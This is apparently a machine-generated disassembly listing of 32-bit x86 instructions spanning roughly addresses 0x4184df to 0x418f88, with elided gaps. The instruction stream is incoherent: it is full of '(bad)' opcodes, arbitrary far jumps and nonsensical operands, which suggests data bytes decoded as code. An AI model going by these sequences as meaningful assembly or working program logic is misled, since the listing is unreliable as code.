  4184df:	ror    BYTE PTR [edx],0x87
  4184e2:	and    al,cl
  4184e4:	fwait
  4184e5:	sbb    al,0xc2
  4184e7:	add    al,0x24
  4184e9:	ja     0x18ec3cdb
  4184ef:	sub    DWORD PTR [ecx-0x629a0239],0x32
  4184f6:	jmp    0x1773:0xd8140d88
  4184fd:	cmp    eax,0x506b57fd
  418502:	cmp    eax,0xebae5de8
  418507:	imul   ebx,DWORD PTR [eax],0xea1059ef
  41850d:	or     al,0xf8
  41850f:	gs xchg esp,eax
  418511:	adc    al,0xdc
  418513:	mov    edx,DWORD PTR [eax+0x74]
  418516:	xor    al,0xe8
  418518:	fst    QWORD PTR [eax]
  41851a:	add    DWORD PTR [eax],eax
  41851c:	aaa    
  41851d:	int3   
  41851e:	jbe    0x418563
  418520:	mov    ch,0xe7
  418522:	ret    0x73
	...
  418541:	add    BYTE PTR ds:0xb2ebf66f,al
  418547:	dec    edx
  418548:	add    al,0x21
  41854b:	mov    ah,0x5b
  41854d:	sbb    DWORD PTR [ebx+0x620cf0a3],0x19
  418554:	xor    al,0xfd
  418556:	sbb    bh,al
  418558:	les    esi,FWORD PTR [ebx+0x15]
  41855b:	aas    
  41855c:	into   
  41855d:	jmp    0xc0c1bfe4
  418562:	add    esp,ebx
  418564:	adc    al,al
  418566:	int    0x3d
  418568:	add    dh,BYTE PTR [ecx]
  41856a:	dec    ebp
  41856b:	and    dl,al
  41856d:	or     al,0xd
  41856f:	daa    
  418570:	add    edx,eax
  418572:	or     edi,edx
  418574:	js     0x4185ba
  418576:	sub    ebx,ebx
  418578:	js     0x4185c6
  41857a:	icebp  
  41857b:	fisubr WORD PTR [ebx]
  41857d:	mov    DWORD PTR [ecx+0x3fcf9b2],edi
  418583:	push   esi
  418584:	les    ecx,FWORD PTR ds:0xdc155dd
  41858a:	xor    eax,0x22ff8298
  41858f:	add    BYTE PTR [edi+0x45],ah
  418592:	adc    DWORD PTR [eax],eax
  418594:	cmp    eax,0xafc90f4f
  418599:	rcr    BYTE PTR [esi+0x75],0xbb
  41859d:	xor    dl,BYTE PTR [edx+0x77]
  4185a0:	sub    al,0xcc
  4185a2:	xchg   BYTE PTR [edx],bh
  4185a4:	mov    edi,0x33
	...
  4185c1:	add    BYTE PTR [eax],al
  4185c3:	add    BYTE PTR [ebp+0x43],ah
  4185c6:	push   cs
  4185c7:	inc    ebx
  4185c8:	or     eax,0xd029258
  4185cd:	add    BYTE PTR [esi+0x24ba094e],ah
  4185d3:	enter  0xc1d2,0x1c
  4185d7:	cld    
  4185d8:	mov    dl,0xb6
  4185da:	sub    DWORD PTR [edx],eax
  4185dc:	or     eax,0xd3efab7d
  4185e1:	mov    ebp,0xec2703ef
  4185e6:	pop    edi
  4185e7:	std    
  4185e8:	xchg   edi,eax
  4185e9:	cmp    ebx,esp
  4185eb:	pop    ecx
  4185ec:	or     eax,0x4aee6630
  4185f1:	jmp    0x76e3:0xbb8c03a6
  4185f8:	shl    edi,cl
  4185fa:	mov    dh,0xc4
  4185fc:	push   ds
  4185fd:	and    cl,bl
  4185ff:	inc    ebx
  418600:	or     eax,0xdec02575
  418605:	je     0x41864a
  418607:	js     0x4185d7
  418609:	repz imul edx,edi,0xc36a2d05
  418610:	cmp    eax,0xad06b629
  418615:	(bad)  
  418616:	out    0x3,al
  418618:	sbb    BYTE PTR [ecx+0x9],bh
  41861b:	add    ecx,DWORD PTR ds:0x53e7200
  418621:	jge    0x41864a
  418623:	jmp    DWORD PTR [ebx+ebp*8+0x98ff]
	...
  418646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418647:	cmp    al,0xf4
  418649:	add    DWORD PTR [esi-0x411700c0],edx
  41864f:	ret    0x4113
  418652:	idiv   DWORD PTR [edi]
  418654:	add    BYTE PTR [edx-0x2b],ch
  418657:	or     al,0x83
  418659:	test   eax,0xe9bd841e
  41865e:	push   cs
  41865f:	add    al,ch
  418661:	jge    0x4185f6
  418663:	mov    edi,0xb85460fd
  418668:	mov    esp,DWORD PTR [ebx*4-0x77c60a0f]
  41866f:	xor    esi,eax
  418671:	xchg   ecx,eax
  418672:	les    ecx,FWORD PTR [ebp+0x439896fd]
  418678:	cld    
  418679:	rcl    ah,cl
  41867b:	xor    eax,DWORD PTR [edx+edi*4]
  41867e:	iret   
  41867f:	test   eax,0xac4c7274
  418684:	xor    DWORD PTR [esi+0x1b],0x13030132
  41868b:	pop    ebp
  41868c:	cmp    DWORD PTR [edi-0x29],esp
  41868f:	in     eax,dx
  418690:	mov    al,cl
  418692:	jmp    FWORD PTR [ecx]
  418694:	adc    al,0x56
  418696:	inc    esp
  418697:	mov    ah,0x51
  418699:	dec    esi
  41869a:	and    al,0x58
  41869c:	push   ss
  41869d:	test   eax,0xedc4810e
  4186a2:	test   eax,eax
  4186a4:	je     0x41868a
  4186a6:	aam    0x3e
  4186a8:	rcl    DWORD PTR [edx],0x0
	...
  4186c7:	add    BYTE PTR [eax],cl
  4186c9:	add    BYTE PTR [eax],al
  4186cb:	loop   0x418664
  4186cd:	xor    ah,dl
  4186cf:	adc    al,BYTE PTR [edx]
  4186d1:	daa    
  4186d2:	div    BYTE PTR [edx]
  4186d4:	adc    BYTE PTR [eax],al
  4186d6:	add    dl,ch
  4186d8:	add    eax,0xb50073bc
  4186dd:	mov    ch,0xcf
  4186df:	test   DWORD PTR [ebx],esi
  4186e1:	imul   DWORD PTR [ebx+ecx*4]
  4186e4:	jns    0x418765
  4186e6:	jg     0x4186a8
  4186e8:	sub    BYTE PTR [ebx-0x6fd8fb88],al
  4186ee:	jo     0x4186ec
  4186f0:	mov    ebx,0x7908871f
  4186f5:	int3   
  4186f6:	je     0x41870a
  4186f8:	sbb    eax,0x176f851
  4186fd:	mov    ds,WORD PTR [ecx-0x8]
  418700:	pop    ds
  418701:	fnstsw WORD PTR [ebp-0x5]
  418704:	je     0x418696
  418706:	push   edi
  418707:	add    BYTE PTR [edi],ah
  418709:	dec    eax
  41870a:	inc    edx
  41870b:	add    eax,0x3cf
  418710:	out    dx,eax
  418711:	fnstenv [edx-0x2b]
  418714:	das    
  418715:	mov    ds:0x37fdb65,al
  41871a:	add    BYTE PTR [eax],al
  41871c:	inc    ecx
  41871d:	mov    ss,edi
  41871f:	add    DWORD PTR [edx+eax*1+0x6b207589],esp
  418726:	pop    ebx
  418727:	push   edi
  418728:	mov    ch,0x2
  41872a:	test   al,al
	...
  418748:	add    BYTE PTR [eax],al
  41874a:	mov    ecx,0x3075fb1b
  41874f:	imul   edx,DWORD PTR [ecx],0x58
  418752:	jne    0x418756
  418754:	mov    DWORD PTR [ebp-0x1c],esi
  418757:	push   0xffffff9a
  418759:	xchg   ebx,edx
  41875b:	shl    DWORD PTR [edx],0xc0
  41875e:	xchg   ebx,eax
  41875f:	and    BYTE PTR [edi-0x37],dl
  418762:	str    WORD PTR ss:[ebx+0x34897ea9]
  41876a:	addr16 dec ecx
  41876c:	push   0x265db
  418771:	push   0xd
  418773:	test   eax,0x7918fd57
  418778:	pop    ss
  418779:	inc    eax
  41877a:	or     eax,0x1d4377b6
  41877f:	sub    al,ch
  418781:	or     al,0x22
  418783:	adc    BYTE PTR [esi],bl
  418785:	shr    dh,0x63
  418788:	mov    ecx,0x1b0d3c6
  41878d:	xchg   ebx,ecx
  41878f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418790:	mov    WORD PTR [ebx+0x19],es
  418793:	idiv   DWORD PTR [esi-0x76baea8d]
  418799:	inc    esi
  41879a:	add    al,0x2a
  41879c:	retf   0x5b09
  41879f:	jle    0x4187b6
  4187a1:	dec    esp
  4187a2:	add    esp,edi
  4187a4:	add    eax,DWORD PTR [ecx-0x27b2437]
  4187aa:	or     al,0x1d
  4187ac:	std    
  4187ad:	out    0x0,eax
	...
  4187cb:	add    BYTE PTR [edi+0x27],bh
  4187ce:	add    DWORD PTR [eax],eax
  4187d0:	xchg   esi,eax
  4187d1:	sbb    al,0xc0
  4187d3:	push   ebp
  4187d4:	pop    ebx
  4187d5:	jg     0x418830
  4187d7:	(bad)  
  4187d8:	mov    edx,0x7fd8386
  4187dd:	mov    ch,0xea
  4187df:	data16 stos BYTE PTR es:[edi],al
  4187e1:	xchg   edx,eax
  4187e2:	add    DWORD PTR [eax],eax
  4187e4:	or     eax,0x20fd1801
  4187e9:	pop    ebx
  4187ea:	lea    eax,[edx+ebx*8-0x75023dee]
  4187f1:	ja     0x4187b3
  4187f3:	adc    esp,ebp
  4187f5:	mov    ah,0x41
  4187f7:	add    BYTE PTR [esi+0x4d830feb],cl
  4187fd:	scas   al,BYTE PTR es:[edi]
  4187fe:	xchg   esi,eax
  4187ff:	shl    edi,0xa0
  418802:	pusha  
  418803:	and    BYTE PTR [esi-0x58],0x36
  418807:	or     al,0x5a
  418809:	add    BYTE PTR [edi+edi*4-0x30f03a7c],bl
  418810:	fwait
  418811:	mov    ebp,0xbd658e16
  418816:	xchg   esp,eax
  418817:	mov    edi,0x29e2c25
  41881c:	or     eax,0x35b3748b
  418821:	scas   eax,DWORD PTR es:[edi]
  418822:	ins    DWORD PTR es:[edi],dx
  418823:	shl    DWORD PTR [eax],0x8a
  418826:	sub    ch,BYTE PTR [ebx-0x3f194341]
  41882c:	mov    esi,0x84cb88
	...
  41884d:	add    cl,bh
  41884f:	(bad)  
  418852:	pop    eax
  418853:	mov    esp,DWORD PTR [eax+eax*8]
  418856:	pop    ebp
  418857:	test   al,0x21
  418859:	xchg   edx,eax
  41885a:	lock mov esp,0x3a92bb72
  418860:	mov    ebx,0xe332e086
  418865:	cmc    
  418866:	call   0x72bc:0x5e8d11a8
  41886d:	inc    esi
  41886e:	sbb    eax,0xe1ac3e56
  418873:	mov    edx,0xbd8cc08e
  418878:	jmp    0x4188af
  41887a:	or     al,0x2a
  41887c:	jecxz  0x4188df
  41887e:	rol    DWORD PTR [edx-0x26],cl
  418881:	add    ecx,DWORD PTR [esi-0x79b80c4b]
  418887:	inc    esp
  418888:	repnz mov cl,BYTE PTR [esi-0x48]
  41888c:	jo     0x4188c4
  41888e:	mov    DWORD PTR [esi+ebx*4],ecx
  418891:	dec    eax
  418892:	or     cl,BYTE PTR [ecx-0x4322f064]
  418898:	mov    esp,0xd0ffe7bb
  41889d:	or     DWORD PTR [ebp-0x72],esi
  4188a0:	add    BYTE PTR [ebx+0xf],bh
  4188a3:	add    BYTE PTR [ecx+0x74b59339],cl
  4188a9:	add    eax,0x72084080
  4188ae:	inc    esi
  4188af:	xchg   esi,ebx
  4188b1:	add    DWORD PTR [eax],eax
	...
  4188cf:	add    BYTE PTR [ebx+0x70],dl
  4188d2:	add    cl,ch
  4188d4:	xchg   edx,eax
  4188d5:	mov    edi,0x4044ed74
  4188da:	adc    eax,ebp
  4188dc:	jbe    0x418914
  4188de:	push   0x7b870ee9
  4188e3:	cmc    
  4188e4:	pop    edx
  4188e5:	dec    eax
  4188e6:	cld    
  4188e7:	pop    esp
  4188e8:	inc    esp
  4188e9:	push   edx
  4188ea:	call   0xfdfceca5
  4188ef:	arpl   WORD PTR [ecx+edx*1+0x5d],dx
  4188f3:	das    
  4188f4:	push   esi
  4188f5:	ret    
  4188f6:	ret    0xef5
  4188f9:	dec    edi
  4188fa:	mov    ebp,ecx
  4188fc:	inc    eax
  4188fd:	dec    ebx
  4188fe:	push   ecx
  4188ff:	bound  eax,QWORD PTR [edi+0x10]
  418902:	push   esi
  418903:	bound  ebx,QWORD PTR [esi-0x64fd214b]
  418909:	xchg   DWORD PTR [edx-0x9],eax
  41890c:	scas   eax,DWORD PTR es:[edi]
  41890d:	stos   DWORD PTR es:[edi],eax
  41890e:	adc    BYTE PTR [edi],0xe
  418911:	out    dx,al
  418912:	push   esp
  418913:	(bad)  
  418914:	(bad)  
  418915:	or     eax,0xa8712c94
  41891a:	out    0x1d,al
  41891c:	adc    BYTE PTR [eax],al
  41891e:	pushw  0x61
  418921:	lock jo 0x418909
  418924:	pushf  
  418925:	jnp    0x418910
  418927:	in     al,0x85
  418929:	fnstenv [ebx-0x1c]
  41892c:	jno    0x418984
  41892e:	cld    
  41892f:	inc    edx
  418930:	or     eax,DWORD PTR [ecx+0xfdc1]
	...
  418952:	mov    DWORD PTR [edi-0x4],edx
  418955:	add    bh,bh
  418957:	vshufps xmm1,xmm2,XMMWORD PTR [eax-0x5e00fffc],0x7b
  418960:	or     esi,DWORD PTR [edi-0x173c78e4]
  418966:	adc    DWORD PTR [esi-0x3c4e0003],edi
  41896c:	jle    0x418943
  41896e:	mov    ah,0x40
  418970:	clc    
  418971:	add    DWORD PTR [ecx+0x3c458717],esp
  418977:	xchg   BYTE PTR [eax],al
  418979:	mov    ebp,DWORD PTR [edi+ecx*4+0x5234fffd]
  418980:	sti    
  418981:	jne    0x4189ab
  418983:	addr16 mov eax,0x83ff247e
  418989:	shl    BYTE PTR [eax+0x33],0xfb
  41898d:	jne    0x41896b
  41898f:	push   ecx
  418990:	sti    
  418991:	jne    0x41895b
  418993:	inc    sp
  418995:	std    
  418996:	retf   
  418997:	jns    0x418919
  418999:	jge    0x418967
  41899b:	add    esi,DWORD PTR [ecx+0x24]
  41899e:	outs   dx,BYTE PTR ds:[esi]
  41899f:	inc    ebp
  4189a0:	std    
  4189a1:	and    DWORD PTR [edx+esi*8-0x854a8e8],0xfffffffb
  4189a9:	(bad)  
  4189aa:	jl     0x4189b5
  4189ac:	mov    dh,0xc0
  4189ae:	add    al,0x91
  4189b0:	inc    esi
  4189b1:	add    al,0xf4
  4189b3:	or     dh,BYTE PTR [esi+0x46]
	...
  4189d1:	add    BYTE PTR [eax],al
  4189d3:	add    BYTE PTR [edi-0x63ba78b2],ah
  4189d9:	jns    0x418a0b
  4189db:	call   0x41be39
  4189e0:	aam    0x3
  4189e2:	pop    ebx
  4189e3:	pop    esi
  4189e4:	iret   
  4189e5:	retf   
  4189e6:	ret    0x7404
  4189e9:	push   edi
  4189ea:	xchg   esp,ebp
  4189ec:	or     eax,0xeacad28
  4189f1:	test   eax,0x99db5101
  4189f6:	nop
  4189f7:	inc    ebx
  4189f8:	pop    ebp
  4189f9:	cwde   
  4189fa:	test   eax,0xbdf19014
  4189ff:	xchg   eax,edx
  418a01:	cld    
  418a02:	xchg   eax,eax
  418a04:	fsubr  DWORD PTR [ecx-0x26cb4011]
  418a0a:	add    eax,0x381e0d00
  418a0f:	lock nop
  418a11:	adc    dh,BYTE PTR ds:0xa8ea860e
  418a17:	mov    dh,0xc0
  418a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1a:	add    DWORD PTR [edi-0x3f77f338],eax
  418a20:	mov    al,ds:0x2173be9e
  418a25:	rcr    dl,1
  418a27:	push   ebx
  418a28:	or     al,0xa7
  418a2a:	test   al,0xda
  418a2c:	mov    cs,WORD PTR [eax+eiz*8+0x0]
  418a30:	lea    ecx,[esp+edx*1+0x0]
  418a34:	jns    0x418a50
  418a36:	jg     0x418a36
	...
  418a54:	add    BYTE PTR [eax],al
  418a56:	or     al,0xf1
  418a58:	push   ecx
  418a59:	mov    DWORD PTR [eax-0x61],esp
  418a5c:	mov    ds,WORD PTR [ebp-0xb]
  418a5f:	adc    eax,0xb4f513bb
  418a64:	inc    ecx
  418a65:	add    BYTE PTR [esi-0x77ff43fc],cl
  418a6b:	cdq    
  418a6c:	cmp    BYTE PTR [ecx],dh
  418a6e:	xchg   BYTE PTR [eax+esi*4],dl
  418a71:	or     edx,0x1ac680ab
  418a77:	or     eax,0x323a5618
  418a7c:	adc    eax,0x3e70358
  418a81:	or     ecx,0x4d86f300
  418a87:	xor    al,0xfa
  418a89:	mov    esp,0x4762b7ce
  418a8e:	jne    0x418b0f
  418a90:	and    eax,0xe7b972d9
  418a95:	clc    
  418a96:	iret   
  418a97:	scas   eax,DWORD PTR es:[edi]
  418a98:	mov    ecx,0x620274dd
  418a9d:	inc    edi
  418a9e:	push   ebp
  418a9f:	xchg   DWORD PTR [edi+ebx*8+0x1ffcb8bc],esp
  418aa6:	pop    ds
  418aa7:	inc    eax
  418aa8:	out    0x88,eax
  418aaa:	mov    esi,0xdcd8daaf
  418aaf:	daa    
  418ab0:	sbb    eax,DWORD PTR [ecx*1-0x31716600]
  418ab7:	xchg   DWORD PTR [edi],ecx
  418ab9:	pop    ebp
	...
  418ad6:	add    BYTE PTR [eax],al
  418ad8:	sar    esi,0xe6
  418adb:	lock pop edx
  418add:	std    
  418ade:	hlt    
  418adf:	sti    
  418ae0:	iret   
  418ae1:	shrd   DWORD PTR [esi-0x6e],eax,cl
  418ae5:	add    ebp,esi
  418ae7:	xchg   esi,eax
  418ae8:	int    0x87
  418aea:	xor    al,0xbd
  418aec:	xchg   edx,eax
  418aed:	xor    dh,BYTE PTR [edi+0x27a0568a]
  418af3:	or     eax,0x4670c1b8
  418af8:	(bad)
  418afb:	or     al,0x93
  418afd:	xor    ch,dl
  418aff:	add    ecx,DWORD PTR ds:0xce02c85
  418b05:	mov    ebp,0x32b8d1da
  418b0a:	xchg   edi,eax
  418b0b:	lock jp 0x418b33
  418b0e:	in     eax,0x25
  418b10:	mov    al,BYTE PTR [edx+0x3b]
  418b13:	pop    edx
  418b14:	xchg   esi,eax
  418b15:	cmp    dh,BYTE PTR ds:0x2174b0
  418b1b:	inc    edx
  418b1c:	popf   
  418b1d:	mov    ebx,0xb1e77b89
  418b22:	fld1   
  418b24:	push   cs
  418b25:	add    BYTE PTR [ecx],al
  418b27:	aam    0xb2
  418b29:	adc    BYTE PTR [ebx+0x5d],0x9
  418b2d:	jae    0x418b7d
  418b2f:	push   es
  418b30:	xchg   BYTE PTR [esp+edx*8],ch
  418b33:	iret   
  418b34:	gs retf 
  418b36:	or     eax,0xffffe864
  418b3b:	call   0x418b40
	...
  418b58:	add    BYTE PTR [eax],al
  418b5a:	xor    cl,dh
  418b5c:	jge    0x418b4e
  418b5e:	add    DWORD PTR [ebp-0x64],edi
  418b61:	jmp    0xa4ca8b74
  418b66:	push   0x7f
  418b68:	cmp    al,0xf9
  418b6a:	push   cs
  418b6b:	or     eax,DWORD PTR [ebx+0xc99]
  418b71:	das    
  418b72:	adc    dl,BYTE PTR [eax]
  418b74:	jmp    FWORD PTR [ebx-0x35]
  418b77:	(bad)  
  418b79:	pusha  
  418b7a:	(bad)  [ebx-0x45750018]
  418b80:	std    
  418b81:	jb     0x418b6c
  418b83:	sbb    ecx,0x55
  418b86:	xor    eax,0x3cf97aef
  418b8b:	push   edi
  418b8c:	and    DWORD PTR [edi-0x2e8c80fa],0x530d3194
  418b96:	std    
  418b97:	mov    ah,0x73
  418b99:	sar    DWORD PTR [edi],0xb5
  418b9c:	adc    edx,DWORD PTR [ecx]
  418b9e:	(bad)  
  418b9f:	aas    
  418ba0:	add    BYTE PTR [edx-0x33],ch
  418ba3:	add    al,0x83
  418ba5:	test   eax,0x684505fd
  418baa:	iret   
  418bab:	fcos   
  418bad:	call   0xbc84c0
  418bb2:	(bad)  
  418bb3:	in     eax,dx
  418bb4:	fsub   st(3),st
  418bb6:	pop    ebx
  418bb7:	in     al,0xfa
  418bb9:	(bad)  [ebp+0x30003]
	...
  418bdb:	add    BYTE PTR [edi],bl
  418bdd:	mov    bh,0xf8
  418bdf:	jb     0x418bee
  418be1:	xchg   DWORD PTR [ecx+0x10],eax
  418be4:	pop    ebp
  418be5:	ret    
  418be6:	xlat   BYTE PTR ds:[ebx]
  418be7:	add    DWORD PTR [ebx+eax*1-0x1],esp
  418beb:	ret    0x8ad1
  418bee:	xlat   BYTE PTR ds:[ebx]
  418bef:	add    DWORD PTR [ebx+eax*1+0x53],esi
  418bf3:	call   0x3edd14
  418bf8:	iret   
  418bf9:	std    
  418bfa:	xor    eax,eax
  418bfc:	call   0xf34e00bc
  418c01:	dec    eax
  418c02:	adc    BYTE PTR [ebx-0x17b0ec97],cl
  418c08:	out    dx,al
  418c09:	xchg   bl,bh
  418c0b:	push   DWORD PTR [edi+0x6b]
  418c0e:	imul   edx,DWORD PTR [ebp+esi*1+0x3],0x6b187589
  418c16:	repnz and DWORD PTR [ebx],0x7a
  418c1a:	in     eax,0xe1
  418c1c:	and    eax,0xc6330003
  418c21:	test   DWORD PTR [edi+0x37cc59f7],edi
  418c27:	push   ebp
  418c28:	aam    0xed
  418c2a:	sub    eax,0xbcb1f66
  418c2f:	test   BYTE PTR [eax+0x3efffffb],ah
  418c35:	(bad)  
  418c36:	push   edi
  418c37:	ins    WORD PTR es:[edi],dx
  418c39:	inc    eax
  418c3a:	mov    ah,0xf
  418c3c:	pop    edx
  418c3d:	inc    ecx
  418c3e:	sub    BYTE PTR [esi+0x0],ah
	...
  418c5d:	add    BYTE PTR [edi],bh
  418c5f:	dec    ecx
  418c60:	and    esp,DWORD PTR [esi+0x75]
  418c63:	pop    ebx
  418c64:	or     BYTE PTR [esi+0xd],ah
  418c67:	mov    ds:0xdb8466c4,al
  418c6c:	jno    0x418bf9
  418c6e:	push   ebx
  418c6f:	retf   0x42b
  418c72:	cmp    eax,0xa6b84024
  418c77:	mov    ebx,0x7013371f
  418c7c:	or     al,BYTE PTR [eax+ebp*4-0x8fffe59]
  418c83:	lods   eax,DWORD PTR ds:[esi]
  418c84:	pop    ecx
  418c85:	data16 test BYTE PTR [ebx+0x6d],ah
  418c89:	or     eax,0x65fb5ebb
  418c8e:	xchg   esi,eax
  418c8f:	outs   dx,BYTE PTR ds:[esi]
  418c90:	cld    
  418c91:	gs dec esp
  418c93:	inc    edi
  418c94:	or     DWORD PTR [esi+0x6],esp
  418c97:	call   0x2f0a13ba
  418c9c:	mov    BYTE PTR [esi-0xc],al
  418c9f:	xchg   edx,eax
  418ca0:	adc    DWORD PTR [eax-0x70],edx
  418ca3:	pop    ebx
  418ca4:	jne    0x418cf6
  418ca6:	cmp    dh,BYTE PTR [ebx-0x5732e9bb]
  418cac:	or     dh,BYTE PTR [ebp-0x3b7a0b30]
  418cb2:	adc    DWORD PTR [ebx-0x543017fc],edx
  418cb8:	add    al,BYTE PTR [eax]
  418cba:	add    ch,bh
  418cbc:	rcl    BYTE PTR [eax-0x68],0x24
  418cc0:	pop    esp
  418cc1:	cld    
	...
  418cde:	add    BYTE PTR [eax],al
  418ce0:	add    dl,bh
  418ce2:	lods   al,BYTE PTR ds:[esi]
  418ce3:	call   0x89433511
  418ce8:	dec    eax
  418ce9:	lahf   
  418cea:	mov    eax,0x6ed9830
  418cef:	push   0xe
  418cf1:	loop   0x418c77
  418cf3:	mov    ebx,0xfdb76b35
  418cf8:	test   BYTE PTR [esp+ebp*4],dl
  418cfb:	call   0x3158d00
  418d00:	or     eax,0x861014b5
  418d05:	cmp    ebx,DWORD PTR [ebx+0x2c]
  418d08:	xchg   ebp,eax
  418d09:	cli    
  418d0a:	out    0x3,al
  418d0c:	xchg   esp,eax
  418d0d:	lds    ecx,FWORD PTR [edi-0x18ff5932]
  418d13:	jg     0x418ce2
  418d15:	sub    al,0xb0
  418d17:	mov    eax,0xf42e0c1e
  418d1c:	(bad)  
  418d1d:	jmp    esi
  418d1f:	push   eax
  418d20:	mul    ebx
  418d22:	mov    esi,0x6487de86
  418d27:	xchg   ebp,edx
  418d29:	mov    bl,0x4e
  418d2b:	mov    ecx,0x2e7fe75
  418d30:	or     eax,0xf430277c
  418d35:	mov    ah,0xbc
  418d37:	je     0x4ace6880
  418d3d:	dec    esi
  418d3e:	je     0x418ccf
  418d40:	in     eax,0xb3
  418d42:	push   ds
  418d43:	mov    ecx,0x0
	...
  418d60:	add    BYTE PTR [eax],al
  418d62:	fbstp  TBYTE PTR [edi+esi*4-0x213f7101]
  418d69:	jle    0x418d77
  418d6b:	jmp    esi
  418d6d:	add    edx,DWORD PTR [ebx+ebp*1-0x6461fb0d]
  418d74:	addr16 cli 
  418d76:	adc    al,BYTE PTR [esi]
  418d78:	ror    BYTE PTR fs:0xa9abe700,1
  418d7f:	xchg   ecx,eax
  418d80:	call   0xe7011e88
  418d85:	jg     0x418d4f
  418d87:	jmp    esi
  418d89:	add    edx,DWORD PTR [esi-0x1e0b40c6]
  418d8f:	dec    edi
  418d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d91:	add    edx,ebx
  418d93:	xchg   DWORD PTR [eax],eax
  418d95:	xor    al,0x9d
  418d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d98:	dec    ebp
  418d99:	arpl   WORD PTR [ebp-0x3e3e764e],ax
  418d9f:	shl    DWORD PTR [eax+ebx*1-0x4a],cl
  418da3:	cmp    eax,edi
  418da5:	pop    ds
  418da6:	out    dx,eax
  418da7:	xchg   cl,dh
  418da9:	add    edi,ebp
  418dab:	mov    dl,0x73
  418dad:	xchg   ecx,eax
  418dae:	mov    edi,DWORD PTR ds:0x1054190d
  418db4:	pop    eax
  418db5:	fisttp WORD PTR [esi+0x0]
  418db8:	and    DWORD PTR [ebp-0x223f7eee],0x277f3b14
  418dc2:	pop    ecx
  418dc3:	mov    ah,0xfd
  418dc5:	jmp    0x418dca
	...
  418de2:	add    BYTE PTR [eax],al
  418de4:	jno    0x418e1f
  418de6:	clc    
  418de7:	fild   DWORD PTR [esi+eiz*4+0x40]
  418deb:	inc    edi
  418dec:	int3   
  418ded:	pop    es
  418dee:	cmp    BYTE PTR [edi+0x775ff06],0x26
  418df5:	mov    bl,0xd9
  418df7:	call   0x22428e0a
  418dfc:	inc    ecx
  418dfd:	mov    bh,0x72
  418dff:	add    BYTE PTR [eax+0x4e80f840],cl
  418e05:	(bad)  
  418e06:	(bad)  
  418e07:	call   0x75028d1a
  418e0c:	xchg   ebp,eax
  418e0d:	(bad)  
  418e0e:	(bad)  
  418e0f:	call   0xce29d922
  418e14:	ret    0xfdb4
  418e17:	add    dl,BYTE PTR [eax]
  418e19:	out    dx,al
  418e1a:	mov    edi,0x12cc96d
  418e1f:	fiadd  WORD PTR [eax+edi*4-0x77]
  418e23:	sub    al,0xb1
  418e25:	push   ecx
  418e26:	call   0xfdf72532
  418e2b:	add    BYTE PTR [edi],al
  418e2d:	lds    edx,FWORD PTR fs:[edx-0x1b]
  418e31:	dec    DWORD PTR [eax+0x4e649075]
  418e37:	cmp    BYTE PTR [ebx+0x6b],0x87
  418e3b:	jne    0x418df9
  418e3d:	mov    BYTE PTR [esi+0x18],bh
  418e40:	add    ebp,DWORD PTR [ebx+0x11]
  418e43:	sbb    BYTE PTR [esi+0x6a003f],dh
	...
  418e65:	add    BYTE PTR [eax+0x37e8716a],ah
  418e6b:	jb     0x418e71
  418e6d:	push   esi
  418e6e:	sbb    edx,DWORD PTR [ecx]
  418e70:	pop    eax
  418e71:	push   ss
  418e72:	in     al,0xfb
  418e74:	jle    0x418e3a
  418e76:	push   0x7975c080
  418e7b:	jmp    0x6b03de93
  418e80:	adc    DWORD PTR [eax+0x72],edx
  418e83:	aas    
  418e84:	add    BYTE PTR [ebx-0xacf7d0],al
  418e8a:	inc    ecx
  418e8b:	or     edx,DWORD PTR [edx]
  418e8d:	inc    eax
  418e8e:	mov    BYTE PTR fs:[ecx-0x494e7a8],dh
  418e95:	call   0x40356e
  418e9a:	mov    edi,0xbd43e058
  418e9f:	pop    eax
  418ea0:	loopne 0x418edd
  418ea2:	jns    0x418e7b
  418ea4:	or     eax,DWORD PTR [edx-0x48795]
  418eaa:	std    
  418eab:	mov    al,BYTE PTR [eax]
  418ead:	add    BYTE PTR [eax+ecx*4],ah
  418eb0:	inc    ecx
  418eb1:	adc    BYTE PTR [edi-0x2a],dl
  418eb4:	push   eax
  418eb5:	mov    DWORD PTR [ecx+0x7d6be7fa],ebx
  418ebb:	push   0xfffffffb
  418ebd:	mov    DWORD PTR [ecx],esi
  418ebf:	adc    BYTE PTR [edi],dh
  418ec1:	ret    
  418ec2:	or     eax,0x48374b55
  418ec7:	mov    ecx,0x3c2b
	...
  418ee8:	nop
  418ee9:	cmp    al,BYTE PTR ds:0x104edd89
  418eef:	mov    ecx,DWORD PTR [ebx-0x66]
  418ef2:	dec    esi
  418ef3:	push   eax
  418ef4:	retf   0x59cb
  418ef7:	push   ss
  418ef8:	dec    ebp
  418ef9:	test   eax,0x1c09c482
  418efe:	shl    DWORD PTR [ebx+eax*1-0x1a],0x82
  418f03:	mov    dh,0xa7
  418f06:	add    DWORD PTR [eax],eax
  418f08:	out    0xdb,al
  418f0a:	adc    esi,DWORD PTR [edx-0x53]
  418f0d:	lea    edx,[eax]
  418f0f:	adc    BYTE PTR [ebx],0xa1
  418f12:	add    DWORD PTR [edx+ebx*1+0x22],esi
  418f16:	xor    BYTE PTR [esi+edx*4],dl
  418f19:	arpl   WORD PTR [ecx],dx
  418f1b:	(bad)  
  418f1c:	shl    DWORD PTR [eax+0x1fe6e801],cl
  418f22:	mov    dh,0xfd
  418f24:	push   0xffffffcb
  418f26:	or     eax,0x49711e8
  418f2b:	add    BYTE PTR [eax+0x7ce8056b],cl
  418f31:	daa    
  418f32:	mov    dh,0xfd
  418f34:	xchg   esi,eax
  418f35:	arpl   WORD PTR [ecx],cx
  418f37:	mov    edi,DWORD PTR [edx+0x20fd4e00]
  418f3d:	add    DWORD PTR [edx],edx
  418f3f:	inc    eax
  418f40:	or     eax,0xb7d4401e
  418f45:	lods   al,BYTE PTR ds:[esi]
  418f46:	add    al,0x12
  418f49:	cdq    
  418f4a:	add    ch,0x0
	...
  418f69:	add    BYTE PTR [ecx],dl
  418f6b:	mov    dh,BYTE PTR [esi+0x41d2c113]
  418f71:	add    BYTE PTR [esi+0x25604db],cl
  418f77:	add    esp,edi
  418f79:	pop    ss
  418f7a:	pop    ds
  418f7b:	inc    eax
  418f7c:	out    0x86,eax
  418f7e:	mov    esi,0xe8b5d358
  418f83:	mov    edx,0x99e2b524
  418f88:	adc    ebp,ecx
